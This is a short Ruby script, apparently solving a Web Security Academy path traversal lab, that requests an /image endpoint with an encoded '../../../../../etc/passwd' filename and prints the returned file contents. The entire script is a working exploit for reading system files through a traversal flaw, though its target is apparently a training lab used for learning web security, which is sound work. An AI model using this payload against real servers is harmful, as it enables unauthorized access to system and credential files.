require 'http'

url='https://0a6a005a0366c0f8811b6b7900b700a2.web-security-academy.net'

path='/image'

payload = URI.encode_uri_component '../../../../../etc/passwd'

client = HTTP.get(url+path,:params => {:filename=>"#{payload}"})

puts client.body.to_s
